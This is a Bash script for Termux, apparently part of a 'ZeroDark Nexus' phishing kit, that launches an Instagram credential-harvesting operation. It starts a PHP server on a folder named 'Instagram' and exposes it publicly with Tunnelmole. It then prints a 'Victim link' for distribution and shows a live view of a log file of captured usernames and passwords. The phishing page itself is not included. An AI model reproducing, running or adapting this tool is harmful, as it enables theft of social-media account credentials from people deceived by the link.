#!/bin/bash
rm tunnelmole.txt
clear
# ZeroDark Nexus Banner
printf "\e[1;32m  [!]         WELCOME TO HACKER        [!]\e[0m\n"
printf "\e[32m==============================================\e[0m\n"
printf "\e[36m  [1] \e[1;32m System: Termux \e[1;34m=> \e[1;33mCreate by Mahadeb  \e[0m\n"
printf "\e[36m  [2]     \e[1;32m   Power By:\e[1;31mZeroDark Nexus        \e[0m\n"
printf "\e[36m  [3]    WARNING: AUTHORIZED ACCESS ONLY!       \e[0m\n"
printf "\e[32m==============================================\e[0m\n"
printf "\e[1;31m  ðŸ“º https://www.youtube.com/@zerodarknexus \e[0m\n"
printf "\e[32m==============================================\e[0m\n\n"
printf "\e[0m"

# Default Port
def_port='8080'

# Color Codes
white=$'\e[1;0m'
red=$'\e[1;31m'
green=$'\e[1;32m'
yellow=$'\e[1;33m'
blue=$'\e[1;34m'
pink=$'\e[1;35m'
A=$'\e[1;36m'
White=$'\e[1;37m'

# File Path
file_path="/data/data/com.termux/files/usr/share/Instagram/User_data.txt"

# Install tunnelmole if not installed
if ! command -v tunnelmole >/dev/null 2>&1; then
    printf "\n ${red}[${white}-${red}]${yellow} Installing Tunnelmole...${white}\n"
    npm install -g tunnelmole
fi

# Ask to delete file before starting
printf "\e[1;31m Do \e[31myou want to \e[1;31mdelete \e[0mthe log file? ( \e[1;31my\e[0m/\e[1;32mn\e[0m):\e[0m"
read delete_choice

if [[ "$delete_choice" == "y" || "$delete_choice" == "Y" ]]; then
    if [ -f "$file_path" ]; then
        rm "$file_path"
        printf "\n ${red}[${white}-${red}]${green} Log file deleted successfully!${white}\n"
    else
        printf "\n ${red}[${white}-${red}]${yellow} Log file does not exist.${white}\n"
    fi
fi

# Input Port
printf "\n ${red}[${white}-${red}]${pink} Input Port ${white}[default:${def_port}]: ${yellow}"
read port
port="${port:-${def_port}}"
printf "\n ${red}[${white}-${red}]${blue} Starting PHP Server on Port: ${yellow}${port}\n"

cd /data/data/com.termux/files/usr/share/Instagram || {
    printf "\n ${red}[${white}!${red}]${yellow} Directory not found! Exiting...\n"
    exit 1
}

php -S 127.0.0.1:"$port" > /dev/null 2>&1 &

# Start Tunnelmole
printf "\n ${red}[${white}-${red}]${green} Starting Public Server with Tunnelmole...${white}\n"
tunnelmole "$port" | tee tunnelmole.txt &  
sleep 5  

# Extract Tunnelmole Public URL
tunnel_url=$(grep -oE 'https://[a-zA-Z0-9.-]+\.tunnelmole\.net' tunnelmole.txt | head -n 1)
clear 
# ZeroDark Nexus Banner
printf "\e[1;32m  [!]         WELCOME TO HACKER        [!]\e[0m\n"
printf "\e[32m==============================================\e[0m\n"
printf "\e[36m  [1] \e[1;32m System: Termux \e[1;34m=> \e[1;33mCreate by Mahadeb  \e[0m\n"
printf "\e[36m  [2]     \e[1;32m   Power By:\e[1;31mZeroDark Nexus        \e[0m\n"
printf "\e[36m  [3]    WARNING: AUTHORIZED ACCESS ONLY!       \e[0m\n"
printf "\e[32m==============================================\e[0m\n"
printf "\e[1;31m  ðŸ“º https://www.youtube.com/@zerodarknexus \e[0m\n"
printf "\e[32m==============================================\e[0m\n\n"
printf "\e[0m"
printf "\n ${red}[${white}-${red}]${green} Successfully Send Victim link:=> ${yellow}$tunnel_url ${white}\n"

if command -v termux-open-url >/dev/null 2>&1 && [ ! -z "$tunnel_url" ]; then
    termux-open-url "$tunnel_url"
fi

# Show file name being monitored
printf "\n ${red}[${white}-${red}]${A} Press Ctrl C to exit. ${white}\n"
printf "\n ${red}[${white}-${red}]${pink} Monitoring show in User&Pass Log file${green}\n"

# Create the file if it doesn't exist
if [ ! -f "$file_path" ]; then
    touch "$file_path"
    echo "..........Live data will be displayed here..........."
fi

# Live file monitoring with green color output
tail -f "$file_path" | while read line; do
    echo -e "${green}$line${white}"
done
